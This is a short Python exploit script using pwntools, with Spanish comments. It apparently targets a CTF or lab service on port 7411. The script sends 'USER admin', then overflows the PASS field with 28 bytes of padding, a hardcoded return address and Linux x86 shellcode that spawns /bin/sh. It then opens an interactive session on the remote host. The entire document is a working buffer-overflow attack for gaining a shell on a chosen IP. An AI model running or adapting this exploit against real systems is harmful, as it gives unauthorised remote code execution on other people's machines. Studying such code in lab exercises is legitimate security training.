#!/usr/bin/python3
from argparse import ArgumentParser
from pwn import *

def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def shellcode_reverse_tcp():
    offset = 28 #numeros de caracteres necesarios para sobreescribir el EIP
    
    shellcode = b""
    shellcode += b"A"*offset
    shellcode += p32(0xffffd610+32) #direccion de memoria proporcionada por el programa
    
    shellcode += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
    shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
    shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
    shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    shellcode += b"\x89\xe3\x31\xc9\xcd\x80"
        
    return shellcode
   
def exploit(direccion_ip):
    try:
        context(os='linux', arch='i386')
        p = remote(direccion_ip, 7411)
        p.recvuntil(b"OK Ready. Send USER command.")
        p.sendline(b"USER admin")
        p.recvuntil(b"OK Send PASS command.")
        p.sendline(b"PASS "+shellcode_reverse_tcp())

        p.interactive()
    except EOFError as e:
        print("Ha ocurrido un error en el manejo del socket: {}".format(e))

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    
    args = parser.parse_args()
    exploit(args.ip)
